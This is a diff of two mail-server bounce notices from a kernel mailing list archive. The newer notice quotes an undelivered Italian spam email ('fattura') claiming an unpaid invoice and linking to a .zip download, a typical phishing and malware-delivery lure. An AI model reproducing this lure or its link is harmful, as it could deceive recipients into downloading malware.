@@ -1,7 +1,7 @@
 From: Mail Delivery System <Mailer-Daemon-jNkmx9sP6i1ZDsxTWlXK6EEOCMrvLtNR@public.gmane.org>
-Subject: Warning: message 1SAcO1-0007eI-E4 delayed 72 hours
-Date: Sun, 25 Mar 2012 16:39:35 +0200
-Message-ID: <E1SBobX-0007cF-Kj@tyto.antiserver.com>
+Subject: Mail delivery failed: returning message to sender
+Date: Mon, 26 Mar 2012 09:38:59 +0200
+Message-ID: <E1SC4W3-00062S-Sm@tyto.antiserver.com>
 Mime-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
 Content-Transfer-Encoding: 7bit
@@ -19,18 +19,38 @@ To: containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org
 List-Id: containers.vger.kernel.org
 
 This message was created automatically by mail delivery software.
-A message that you sent has not yet been delivered to one or more of its
-recipients after more than 72 hours on the queue on tyto.antiserver.com.
 
-The message identifier is:     1SAcO1-0007eI-E4
-The subject of the message is: fattura
-The date of the message is:    Thu, 22 Mar 2012 03:24:37 -0400
-
-The address to which the message has not yet been delivered is:
+A message that you sent could not be delivered to one or more of its
+recipients. This is a permanent error. The following address(es) failed:
 
   0j7s0066gmihxi30-aaEGB+p6/o8IppBpKnWeoA@public.gmane.org
+    retry timeout exceeded
 
-No action is required on your part. Delivery attempts will continue for
-some time, and this warning may be repeated at intervals if the message
-remains undelivered. Eventually the mail delivery software will give up,
-and when that happens, the message will be returned to you.
+------ This is a copy of the message, including all the headers. ------
+
+Return-path: <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+Received: from [174.143.39.211] (helo=192.168.100.211)
+	by tyto.antiserver.com with esmtpa (Exim 4.69)
+	(envelope-from <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>)
+	id 1SAcO1-0007eI-E4
+	for 0j7s0066gmihxi30-aaEGB+p6/o8IppBpKnWeoA@public.gmane.org; Thu, 22 Mar 2012 08:24:41 +0100
+Received: from [192.168.100.211] by 192.168.100.211 id rRnISV1L4mxq; Thu, 22 Mar 2012 03:24:37 -0400
+Message-ID: <006501cd07fc$c745b600$0200a8c0-Q0ErXNX1RuY12lcLGu02Ww@public.gmane.org>
+From: "Pay" <containers-cunTk1MwBs9QetFLy7KEm3xJsTq8ys+cHZ5vskTnxNA@public.gmane.org>
+To: <0j7s0066gmihxi30-aaEGB+p6/o8IppBpKnWeoA@public.gmane.org>
+Subject: fattura
+Date: Thu, 22 Mar 2012 03:24:37 -0400
+MIME-Version: 1.0
+Content-Type: text/plain;
+	charset="windows-1252"
+Content-Transfer-Encoding: 8bit
+
+
+         
+Gentile utente, 
+   
+
+
+Si prega di notare che hai una fattura non pagata.
+
+Dettagli: http://www.acunbusa.it/i/Fattura/Pagamento.zip
